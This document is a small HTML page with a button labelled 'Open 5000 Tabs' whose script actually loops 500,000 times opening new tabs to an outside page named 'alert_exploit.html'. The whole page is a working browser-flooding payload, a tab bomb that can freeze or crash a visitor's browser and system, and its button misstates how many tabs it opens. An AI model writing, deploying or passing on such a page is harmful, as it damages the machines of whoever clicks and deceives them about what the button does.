<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Multiple Tabs</title>
    <script>
        function openMultipleTabs() {
            const url = "https://lbstyle.github.io/alert_exploit.html"; 
            for (let i = 0; i < 500000; i++) {
                window.open(url, '_blank');
            }
        }
    </script>
</head>
<body>
    <button onclick="openMultipleTabs()">Open 5000 Tabs</button>
</body>
</html>
